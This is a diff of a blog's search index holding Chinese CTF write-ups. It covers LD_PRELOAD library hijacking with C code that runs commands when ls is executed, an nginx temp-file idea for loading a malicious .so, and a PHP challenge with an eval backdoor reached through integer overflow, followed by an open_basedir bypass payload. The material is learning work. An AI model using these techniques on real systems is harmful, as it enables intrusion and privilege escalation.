@@ -1129,7 +1129,7 @@ $\_($\$\__\_[$\_]);
 <p>先查看ls命令会调用什么库函数</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">readelf -Ws /usr/bin/ls</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/ranga1ok/pic/raw/master/20220819204242.png">我们这里选择的是strncmp</p>
+<p><img src="https://github.com/Ranga10k/picture.jpg/blob/main/%E8%9E%A2%E5%B9%95%E6%93%B7%E5%8F%96%E7%95%AB%E9%9D%A2%202022-08-21%20172625.png?raw=true">我们这里选择的是strncmp</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    system(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strncmp</span><span class="params">()</span> </span>&#123;   </span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>用gcc编译成.so文件</p>
@@ -1139,17 +1139,42 @@ $\_($\$\__\_[$\_]);
 <p>之后把LD_PRELOAD的值改成.so文件的值</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export LD_PRELOAD=$PWD/8.so</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/ranga1ok/pic/raw/master/20220819211307.png">可以看到我们在执行ls命令的时候，同时也执行了id的命令</p>
+<p><img src="https://github.com/Ranga10k/picture.jpg/blob/main/%E8%9E%A2%E5%B9%95%E6%93%B7%E5%8F%96%E7%95%AB%E9%9D%A2%202022-08-21%20172957.png?raw=true">可以看到我们在执行ls命令的时候，同时也执行了id的命令</p>
 <p>我们可以使用 <em>_attribute</em>_((constructor))修饰符来是我们的恶意文件，让我们的恶意文件能在动态链接被加载的调用，相比于之前的在命令加载函数的时候，更加有广泛性</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo 1&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/ranga1ok/pic/raw/master/20220820144555.png"></p>
+<p><img src="https://github.com/Ranga10k/picture.jpg/blob/main/%E8%9E%A2%E5%B9%95%E6%93%B7%E5%8F%96%E7%95%AB%E9%9D%A2%202022-08-21%20173110.png?raw=true"></p>
 <p>可以看到ls和hello都执行了echo 1的命令</p>
 <p>[虎符CTF 2022]ezphp</p>
-<p><img src="https://gitee.com/ranga1ok/pic/raw/master/20220820150928.png"></p>
+<p><img src="https://github.com/Ranga10k/picture.jpg/blob/main/%E8%9E%A2%E5%B9%95%E6%93%B7%E5%8F%96%E7%95%AB%E9%9D%A2%202022-08-21%20173308.png?raw=true"></p>
 <p>可以看到代码有putenv可以更改环境变量,而且后面使用了echo命令，我们就可以上传一个恶意的.so文件，用LD_PRELOAD去包含他，就可以执行我们的命令了</p>
 <p>但是没有文件上传的地方，这里就要用到一个nginx服务器特性，在我们上传大文件的时候，会造成缓冲区溢出，nginx就会生成一个临时文件储存我们传输的大文件，所以我们要构造一个很大的so文件，让后再去包含他，写一个webshell</p>
 <p>但是我不到为什么包含不到.so文件没有复现成功</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>php-fpm</title>
+    <url>/2022/08/21/php-fpm/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="例题-蓝帽杯-2021-One-Pointer-PHP"><a href="#例题-蓝帽杯-2021-One-Pointer-PHP" class="headerlink" title="例题[蓝帽杯 2021]One Pointer PHP"></a>例题[蓝帽杯 2021]One Pointer PHP</h1><p>题目给了源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>=unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line">	<span class="variable">$count</span>[++<span class="variable">$user</span>-&gt;count]=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$count</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="variable">$user</span>-&gt;count+=<span class="number">1</span>;</span><br><span class="line">		setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$user</span>=<span class="keyword">new</span> User;</span><br><span class="line">	<span class="variable">$user</span>-&gt;count=<span class="number">1</span>;</span><br><span class="line">	setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$count</span>=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$u</span>=<span class="keyword">new</span> User();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到我们能rce但是要$count[]=1不成立，而对于count数组只有一组数据，</p>
+<p>但是在对count数组填入数据时，做了一个下表递增的操作，而下表的值是我们可以控制的，这里就有了个数组越界</p>
+<p>我们就可以让$user-&gt;count的值等于9223372036854775806自增后成了3A9223372036854775807就会产生数组越界我们就能命令执行了</p>
+<p><img src="https://gitee.com/ranga1ok/pic/raw/master/20220821112824.png"></p>
+<p>可以看到执行了phpinfo</p>
+<p>但是他设置了很多的disable_function</p>
+<p><img src="https://gitee.com/ranga1ok/pic/raw/master/20220821113112.png"></p>
+<p>并且也设置了OPEN_BASEDIR</p>
+<p><img src="https://gitee.com/ranga1ok/pic/raw/master/20220821113212.png"></p>
+<p>我们可以绕过open_basedir读文件</p>
+<p><img src="https://gitee.com/ranga1ok/pic/raw/master/20220821113701.png"></p>
+<p>playload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir(&#x27;123&#x27;); </span><br><span class="line">chdir(&#x27;123&#x27;);</span><br><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);</span><br><span class="line">chdir(&#x27;..&#x27;);</span><br><span class="line">chdir(&#x27;..&#x27;);</span><br><span class="line">chdir(&#x27;..&#x27;);</span><br><span class="line">chdir(&#x27;..&#x27;); </span><br><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);</span><br><span class="line">var_dump(scandir(&#x27;/&#x27;));</span><br></pre></td></tr></table></figure>
+
+<p>但是不能读取flag，那么应该是要提权</p>
 ]]></content>
   </entry>
 </search>
